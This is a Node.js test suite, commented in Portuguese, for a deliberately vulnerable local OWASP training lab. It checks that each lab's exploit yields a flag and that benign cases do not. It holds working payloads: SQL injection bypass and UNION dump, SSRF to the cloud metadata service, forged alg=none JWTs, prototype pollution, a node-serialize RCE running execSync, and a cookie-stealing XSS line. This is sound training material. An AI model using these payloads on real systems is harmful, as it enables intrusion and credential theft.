/**
 * Suite COMPLETA dos laboratorios OWASP A01..A10 (edição 2025).
 * Cobre, para cada lab: (1) exploit POSITIVO valida a flag; (2) casos NEGATIVOS
 * (baseline legitimo, near-miss, falta de auth) NAO vazam a flag / nao sao aceitos.
 *
 * Requer um servidor RECEM-INICIADO (seed limpo), pois o A06 reseta a senha do admin.
 * Rode:  node test-all.mjs
 * Sai com codigo != 0 se qualquer assercao falhar.
 */
const B = `http://localhost:${process.env.API_PORT ?? 4000}/api`;
import crypto from 'node:crypto';
// Replica o MESMO hash fraco do backend (server/db.ts) so para o teste calcular
// o valor esperado e validar o exploit do lab A04 — nao e uso em producao.
const md5 = (s) => crypto.createHash('md5').update(s).digest('hex'); // NOSONAR (javascript:S4790 — script de teste, espelha o alvo proposital do lab)
const b64url = (s) => Buffer.from(s).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
const d64 = (s) => Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString();
const signHS256 = (payload, secret) => {
  const h = b64url(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const p = b64url(JSON.stringify(payload));
  const sig = Buffer.from(crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest()).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  return `${h}.${p}.${sig}`;
};
const flagIn = (s) => (String(s).match(/CYBER\{[^}]+\}/) || [null])[0];

// `path` so vem de literais de teste definidos mais abaixo neste mesmo arquivo
// (nunca de input externo); o destino e sempre o localhost do lab.
const http = async (method, path, { body, headers } = {}) => {
  const r = await fetch(B + path, { // NOSONAR (jssecurity:S8476 — path e literal interno do teste, nao input de usuario)
    method,
    headers: { ...(body ? { 'content-type': 'application/json' } : {}), ...(headers || {}) },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  let json; try { json = JSON.parse(text); } catch {}
  return { status: r.status, text, json };
};
const get = (p, h) => http('GET', p, { headers: h });
const post = (p, b, h) => http('POST', p, { body: b, headers: h });
const put = (p, b, h) => http('PUT', p, { body: b, headers: h });

let pass = 0, fail = 0; const fails = [];
const ok = (name, cond, detail = '') => {
  if (cond) { pass++; /* console.log('  ok', name); */ }
  else { fail++; fails.push(`${name}${detail ? ' — ' + detail : ''}`); }
};
const validates = async (labId, flag) => {
  if (!flag) return false;
  const r = await post('/validate-flag', { labId, flag });
  return r.json?.correct === true;
};
const section = (t) => console.log(`\n── ${t} ──`);

// ════════════════════ A01 — IDOR (leitura + escrita, user-controlled key) ════════════════════
section('A01 IDOR');
{
  const u2 = (await post('/a01/login', { username: 'suporte_financeiro', password: '123456' })).json.accessToken;
  ok('A01 login user', !!u2);

  const own = await get('/a01/users/2/profile', { authorization: 'Bearer ' + u2 });
  ok('A01 atacante (id 2) lendo o próprio perfil: seus dados, SEM a flag', own.json?.userId === 2 && !flagIn(own.text));

  const cross = await get('/a01/users/4/profile', { authorization: 'Bearer ' + u2 });
  ok('A01 IDOR horizontal: atacante (id 2) lê a VÍTIMA joana.rh (id 4) → flag', cross.json?.userId === 4 && await validates('a01-idor-invoices', flagIn(cross.text)));
  ok('A01 LEITURA cruzada expõe PII da vítima (cpf/salary)', cross.json?.cpf != null && cross.json?.salary != null);

  const wOwn = await put('/a01/users/2/profile', { note: 'meus dados' }, { authorization: 'Bearer ' + u2 });
  ok('A01 ESCRITA no próprio perfil (id 2): ok, sem flag', wOwn.json?.updated === true && !flagIn(wOwn.text));

  const wCross = await put('/a01/users/4/profile', { note: 'alterado por atacante' }, { authorization: 'Bearer ' + u2 });
  ok('A01 ESCRITA cruzada: atacante altera o perfil da vítima (id 4) → flag', wCross.json?.updated === true && await validates('a01-idor-invoices', flagIn(wCross.text)));

  const noAuth = await get('/a01/users/4/profile');
  ok('A01 sem sessão → 401', noAuth.status === 401 && !flagIn(noAuth.text));

  const missing = await get('/a01/users/999/profile', { authorization: 'Bearer ' + u2 });
  ok('A01 perfil inexistente → 404', missing.status === 404);
}

// ════════════════════ A02 — Misconfig (precisa vir antes do A07 p/ vazar JWT_SECRET) ════════════════════
section('A02 Misconfig');
let JWT_SECRET;
{
  const dbg = await get('/a02/debug/env');
  JWT_SECRET = dbg.json?.jwtSecret;
  ok('A02 /debug/env vaza appSecret=flag', await validates('a05-misconfig-debug', flagIn(dbg.text)));
  ok('A02 dump também vaza JWT_SECRET (p/ A07)', typeof JWT_SECRET === 'string' && JWT_SECRET.length > 0);
  const baseline = await get('/a02/');
  ok('A02 baseline (/) NÃO vaza flag', !flagIn(baseline.text));
}

// ════════════════════ A01-SSRF — SSRF (precisa vir antes do A08 p/ roubar a chave) ════════════════════
section('A01 SSRF');
let awsKey;
{
  const ext = await get('/a01/fetch-url?url=' + encodeURIComponent('https://status.cybershield.local/health'));
  ok('A01-SSRF baseline (URL externa) NÃO vaza flag', !flagIn(ext.text));
  const base = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  const role = (await get('/a01/fetch-url?url=' + encodeURIComponent(base))).text.trim().split('\n')[0];
  ok('A01-SSRF IMDS passo 1 lista a role', /ec2-app-role/.test(role), `role=${role}`);
  const creds = await get('/a01/fetch-url?url=' + encodeURIComponent(base + role));
  awsKey = flagIn(creds.text);
  ok('A01-SSRF IMDS passo 2 vaza SecretAccessKey=flag', await validates('a10-ssrf', awsKey));
}

// ════════════════════ A04 — Token reversível ════════════════════
section('A04 Crypto');
{
  const login = await post('/a04/login', { username: 'suporte_financeiro', password: '123456' });
  const tok = login.json.sessionToken;
  const normal = await get('/a04/account', { authorization: 'Bearer ' + tok });
  ok('A04 token original (role user) NÃO vaza', normal.json?.role === 'user' && normal.json?.privilegedApiKey === undefined && !flagIn(normal.text));
  const claims = JSON.parse(d64(tok)); claims.role = 'admin';
  const forged = await get('/a04/account', { authorization: 'Bearer ' + b64url(JSON.stringify(claims)) });
  ok('A04 token forjado (role admin) vaza privilegedApiKey=flag', await validates('a02-reversible-token', flagIn(forged.text)));
}

// ════════════════════ A05 — SQLi ════════════════════
section('A05 SQLi');
{
  const normal = await post('/a05/login', { username: 'admin', password: 'senha123' });
  ok('A05 login normal (senha errada) → sem auth, sem flag', normal.json?.authenticated !== true && !flagIn(normal.text));
  const bypass = await post('/a05/login', { username: "admin' OR '1'='1' -- ", password: 'x' });
  ok('A05 bypass booleano autentica como admin', bypass.json?.authenticated === true);
  const dump = await post('/a05/login', { username: "x' UNION SELECT id, username, password_md5, role, api_key FROM users -- ", password: 'x' });
  ok('A05 UNION dumpa a tabela (múltiplas linhas)', (dump.json?.rowCount ?? 0) >= 4);
  ok('A05 dump expõe apiKey do admin = flag', await validates('a03-sqli-login', flagIn(dump.text)));
}

// ════════════════════ A03 — Prototype pollution ════════════════════
section('A03 Components');
{
  const benign = await post('/a03/merge-config', { theme: 'light' });
  ok('A03 merge benigno NÃO vaza masterKey', !flagIn(benign.text));
  const polluted = await post('/a03/merge-config', JSON.parse('{"__proto__":{"isAdmin":true}}'));
  ok('A03 prototype pollution vaza masterKey=flag', await validates('a06-vuln-components', flagIn(polluted.text)));
  const after = await post('/a03/merge-config', { theme: 'dark' });
  ok('A03 poluição revertida (sem vazamento residual)', !flagIn(after.text));
}

// ════════════════════ A07 — JWT (alg=none, assinatura adulterada, segredo vazado) ════════════════════
section('A07 JWT');
{
  const jwtUser = (await post('/a07/login', { username: 'dev_junior', password: 'qwerty' })).json.accessToken;
  const asUser = await get('/a07/admin', { authorization: 'Bearer ' + jwtUser });
  ok('A07 JWT de user → 403 sem flag', asUser.status === 403 && !flagIn(asUser.text));

  const none = `${b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }))}.${b64url(JSON.stringify({ sub: 'dev_junior', role: 'admin' }))}.`;
  const asNone = await get('/a07/admin', { authorization: 'Bearer ' + none });
  ok('A07 alg=none forjado → vaza deployKey=flag', await validates('a07-jwt-none', flagIn(asNone.text)));

  const tampered = signHS256({ sub: 'dev_junior', role: 'admin' }, 'segredo-errado-123');
  const asTampered = await get('/a07/admin', { authorization: 'Bearer ' + tampered });
  ok('A07 HS256 com assinatura ADULTERADA → rejeitado (sem flag)', asTampered.status >= 400 && !flagIn(asTampered.text), `status=${asTampered.status}`);

  const valid = signHS256({ sub: 'dev_junior', role: 'admin' }, JWT_SECRET);
  const asValid = await get('/a07/admin', { authorization: 'Bearer ' + valid });
  ok('A07 HS256 VÁLIDO c/ JWT_SECRET vazado no A02 → vaza flag (kill chain)', await validates('a07-jwt-none', flagIn(asValid.text)));
}

// ════════════════════ A08 — Desserialização (exige X-Cloud-Key do A01-SSRF + IIFE) ════════════════════
section('A08 Deserialization');
{
  const benignNoKey = await post('/a08/import-profile', { data: '{"name":"ana","role":"user"}' });
  ok('A08 sem X-Cloud-Key → 401 sem flag', benignNoKey.status === 401 && !flagIn(benignNoKey.text));
  const benignKey = await post('/a08/import-profile', { data: '{"name":"ana","role":"user"}' }, { 'x-cloud-key': awsKey });
  ok('A08 com chave mas SEM IIFE → não executa, sem flag', benignKey.status < 400 && !flagIn(benignKey.text));
  const rce = await post('/a08/import-profile', { data: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('id')}()"}` }, { 'x-cloud-key': awsKey });
  ok('A08 IIFE node-serialize + chave → RCE, vaza commandOutput=flag', await validates('a08-insecure-deser', flagIn(rce.text)));
}

// ════════════════════ A09 — Log injection -> XSS no dashboard do SOC ════════════════════
section('A09 Log injection -> dashboard XSS');
{
  const normal = await post('/a09/login', { username: 'ana.paula' });
  ok('A09 login normal NÃO libera clearanceToken', !flagIn(normal.text));

  const dashBaseline = await get('/a09/dashboard');
  ok('A09 dashboard baseline (sem payload) NÃO reporta sessão sequestrada', !dashBaseline.json?.analystSession && !flagIn(dashBaseline.text));

  // O log e CUMULATIVO (trilha de auditoria de verdade) — por isso o teste forja
  // o evento PRIMEIRO e so DEPOIS injeta o script, verificando o estado intermediario
  // (forjado sem script -> ainda sem flag) antes de completar a combinacao.
  const forgedOnly = await post('/a09/login', { username: 'x\nAUDIT event=admin_login_success user=ceo' });
  ok('A09 evento forjado SOZINHO (sem script): SIEM aceita, mas NÃO vaza a flag ainda', !flagIn(forgedOnly.text));
  const dashAfterForgeOnly = await get('/a09/dashboard');
  ok('A09 dashboard com SÓ o evento forjado (sem <script> em lugar nenhum do log) continua sem flag',
    !dashAfterForgeOnly.json?.analystSession && !flagIn(dashAfterForgeOnly.text));

  const addScript = await post('/a09/login', { username: '<script>exfil(document.cookie)</script>' });
  ok('A09 <script> é aceito no log (completa a combinação com o evento já forjado)', addScript.status === 200);
  const dashFinal = await get('/a09/dashboard');
  ok('A09 dashboard com AMBAS as técnicas combinadas no log → sessão do analista sequestrada, vaza clearanceToken=flag',
    dashFinal.json?.analystSession?.hijacked === true && await validates('a09-log-injection', flagIn(dashFinal.text)));
}

// ════════════════════ A06 — Reset previsível (POR ÚLTIMO: reseta a senha do admin) ════════════════════
section('A06 Insecure Design');
{
  const noMail = await get('/a06/mailbox/admin');
  ok('A06 mailbox antes do /forgot → 404, sem token', noMail.status === 404);

  await post('/a06/forgot', { username: 'admin' });

  const mail = await get('/a06/mailbox/admin');
  ok('A06 mailbox após /forgot confirma envio, mas MASCARA o token', mail.status === 200 && /••••/.test(mail.json?.resetLink ?? '') && !/\d{9,}/.test(mail.text));

  const now = (await get('/a06/server-time')).json.epochSeconds;
  const wrong = await post('/a06/reset', { username: 'admin', token: String(now - 99999), newPassword: 'X#1' });
  ok('A06 token fora da janela → rejeitado, sem flag', !flagIn(wrong.text));
  const good = await post('/a06/reset', { username: 'admin', token: String(now), newPassword: 'Pwned#1' });
  ok('A06 token previsto (epoch) → account takeover, vaza recoveryNote=flag', await validates('a04-insecure-reset', flagIn(good.text)));
}

// ════════════════════ A10 — Exceptional Conditions (fail-open) ════════════════════
section('A10 Exceptional Conditions');
{
  const okTx = await post('/a10/transfers/approve', { transferId: 'TR-1', amount: 500 });
  ok('A10 transferência pequena → aprovada normalmente, sem flag', okTx.status === 200 && okTx.json?.riskEngine === 'ok' && !flagIn(okTx.text));
  const big = await post('/a10/transfers/approve', { transferId: 'TR-2', amount: 25000 });
  ok('A10 transferência acima do limite → 202 revisão manual, sem flag', big.status === 202 && !flagIn(big.text));
  const bad = await post('/a10/transfers/approve', { transferId: 'TR-3', amount: 'abc' });
  ok('A10 amount não numérico → fail-open: aprovada + vaza treasuryVoucher=flag', bad.json?.status === 'approved' && await validates('a10-fail-open', flagIn(bad.text)));
  const neg = await post('/a10/transfers/approve', { transferId: 'TR-4', amount: -1 });
  ok('A10 amount negativo também cai no fail-open', neg.json?.riskEngine === 'degraded (fail-open)');
}

// ════════════════════ Resumo ════════════════════
console.log(`\n═══════════════════════════════════════`);
console.log(`RESULTADO: ${pass} passaram, ${fail} falharam  (${pass + fail} asserções)`);
if (fail) { console.log('\nFALHAS:'); for (const f of fails) console.log('  ❌', f); process.exit(1); }
else console.log('✅ TODOS OS TESTES PASSARAM (positivos + negativos).');
